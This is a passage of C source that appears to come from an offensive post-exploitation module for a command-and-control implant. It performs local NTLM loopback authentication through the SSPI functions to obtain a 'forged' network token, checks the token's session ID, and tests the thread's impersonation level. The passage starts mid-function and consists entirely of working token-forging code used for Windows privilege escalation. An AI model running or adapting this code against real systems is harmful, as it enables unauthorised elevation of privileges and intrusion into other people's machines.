    secStatus = (SECURITY_STATUS) SECUR32$InitializeSecurityContextA(NULL, &clientContextHandle, NULL, 0, 0, SECURITY_NATIVE_DREP, &challengeDesc, 0, &clientContextHandle, &authenticateDesc, &clientContextAttributes, &lifetimeClient);
    if (!SEC_SUCCESS(secStatus)) {
        BadgerDispatch(g_dispatch, "[-] InitializeSecurityContext Type 3 failed with secstatus code 0x%x \n", secStatus);
        return NULL;
    }

    secStatus = (SECURITY_STATUS) SECUR32$AcceptSecurityContext(NULL, &serverContextHandle, &authenticateDesc, 0, SECURITY_NATIVE_DREP, &serverContextHandle, NULL, &serverContextAttributes, &lifetimeServer);
    if (!SEC_SUCCESS(secStatus)) {
        BadgerDispatch(g_dispatch, "[-] AcceptSecurityContext failed with secstatus code 0x%x \n", secStatus);
        return NULL;
    }
    SECUR32$QuerySecurityContextToken(&serverContextHandle, &hTokenNetwork);

    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, negotiateBuffer.pvBuffer);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, challengeBuffer.pvBuffer);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, authenticateBuffer.pvBuffer);
    SECUR32$FreeCredentialsHandle(&hCredClient);
    SECUR32$FreeCredentialsHandle(&hCredServer);
    SECUR32$DeleteSecurityContext(&clientContextHandle);
    SECUR32$DeleteSecurityContext(&serverContextHandle);

    return hTokenNetwork;
}

void CheckTokenSession(HANDLE hToken) {
    DWORD retLenght = 0;
    DWORD tokenSessionId = 0;
    if (!ADVAPI32$GetTokenInformation(hToken, TokenSessionId, &tokenSessionId, sizeof(DWORD), &retLenght)) {
        BadgerDispatch(g_dispatch, "[-] GetTokenInformation failed with error code %d \n", KERNEL32$GetLastError());
        return;
    }
    // This should be always true for Windows versions <= 10 Build 1809 
    if (tokenSessionId == 0)
        BadgerDispatch(g_dispatch, "[*] Forged Token Session ID set to 0. Older Win version detected, lsasrv!LsapApplyLoopbackSessionId probably not present here...\n");
    else
        BadgerDispatch(g_dispatch, "[*] Forged Token Session ID set to %d. lsasrv!LsapApplyLoopbackSessionId adjusted the token to our current session \n", tokenSessionId);
}

BOOL IsThreadTokenIdentification() {
    HANDLE hTokenImp;
    SECURITY_IMPERSONATION_LEVEL impLevel;
    DWORD retLenght = 0;
    if(!ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), MAXIMUM_ALLOWED, TRUE, &hTokenImp)) {
        BadgerDispatch(g_dispatch, "[-] OpenThreadToken failed with error code %d \n", KERNEL32$GetLastError());
        return FALSE;
    }
    if (!ADVAPI32$GetTokenInformation(hTokenImp, TokenImpersonationLevel, &impLevel, sizeof(SECURITY_IMPERSONATION_LEVEL), &retLenght)) {
        BadgerDispatch(g_dispatch, "[-] GetTokenInformation failed with error code %d \n", KERNEL32$GetLastError());
        return FALSE;
    }
    if (impLevel < SecurityImpersonation)
        return TRUE;
    else
        return FALSE;
    KERNEL32$CloseHandle(hTokenImp);
}